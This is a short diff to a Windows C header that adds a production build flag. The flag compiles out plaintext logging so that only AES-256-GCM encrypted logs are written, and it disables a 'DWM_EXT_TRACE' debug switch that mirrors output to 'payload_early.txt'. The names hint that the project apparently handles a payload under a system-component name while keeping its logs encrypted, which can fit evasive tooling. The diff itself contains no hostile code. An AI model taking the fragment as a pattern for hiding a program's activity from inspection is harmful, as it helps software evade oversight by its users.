@@ -59,6 +59,21 @@ extern "C" {
 #define SVC_ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
 #define SVC_UNUSED(x)     ((void)(x))
 
+/* ─── Production build flag ─── *
+ *
+ * When 1: ALL plaintext-fallback log paths are compiled out. The
+ * DWM_EXT_TRACE env-var check becomes dead code (returns 0). Only the
+ * AES-256-GCM encrypted `.log` streams are written to disk.
+ *
+ * When 0 (dev): DWM_EXT_TRACE=1 unlocks the plaintext mirror to
+ * payload_early.txt for iteration debugging.
+ *
+ * Toggle via `/DSVCLDB_PRODUCTION_BUILD=1` in build.bat (default in
+ * production). Do NOT ever ship with this = 0. */
+#ifndef SVCLDB_PRODUCTION_BUILD
+#define SVCLDB_PRODUCTION_BUILD 1
+#endif
+
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
 #endif
